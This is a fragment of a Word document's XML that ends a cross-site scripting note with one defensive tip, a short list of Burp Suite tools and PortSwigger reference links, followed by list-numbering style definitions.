    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Do not output untrusted input into JavaScript sinks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>DOM invader</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId43" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp collaborator (pro)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId44" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp web vulnerability scanner</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/cross-site-scripting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/research/alert-is-dead-long-live-print</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00B358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5EC879E6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="D6225EC6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="459E4DE0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="003EB3CA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="C69CDDE8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="C876E264">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C632E2C4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="1C94D018">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="E8AEE60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E6645056">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="4F2A553C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="7AEC2F0E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="AA84264A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="450E8028">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="E72C3226">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="329265FA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A2CAAB74">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="1974CDEC">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000003"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000003"/>
    <w:lvl w:ilvl="0" w:tplc="162266C2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="*"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="BC2C68CE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="3CBED778">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="CBA62B1E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="A190A544">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="8D2089DE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="6922C7C8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="EC562CF2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="8E8E4B5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175A1EF6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="07F21090">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A0D6BA1A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="E6A28D48">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="9F88C4AA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="41769996">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="79E25FB6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="5214468A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="6D804EB2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000005"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000005"/>
    <w:lvl w:ilvl="0" w:tplc="591036CC">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="BCCA01F4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="28EA1D8E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="190C2308">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="3906E768">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="403E1C0A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="151C4966">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="4934D99C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="B944FEE4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00610664"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000003"/>
    <w:lvl w:ilvl="0" w:tplc="42426F72">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="E0CA4390">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="704C79F6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="60E6B420">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="AF18D7AE">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="E214C5C2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="300EF3B6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="40F69046">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="6B24E28C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="031120C0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000001"/>
    <w:lvl w:ilvl="0" w:tplc="913080F8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="295E4E3C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A9A21824">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="68585EA6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="5CEAD13A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="42EE2052">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="581E07F8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0DF6E6A6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="EECA81A6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0519324B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000003"/>
    <w:lvl w:ilvl="0" w:tplc="EAD241A8">
      <w:start w:val="2"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="422CE292">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="B1EACB1A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="2ABCB9B8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="4266929A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="A05465D4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="03CAD1A2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="EC32CD4E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="A5C4E85A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0A05343E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000001"/>
    <w:lvl w:ilvl="0" w:tplc="598E19C0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="3D2C40EA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="D4401BE6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="BC90749C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="05BC74AE">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="C1404EAC">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="9D8EC3B6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A6C2EBA8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="526ED47E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="14A01995"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000001"/>
    <w:lvl w:ilvl="0" w:tplc="E39C55E2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="14382986">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="40DA4AA2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="8F86964E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="B97A05A8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="384410C0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
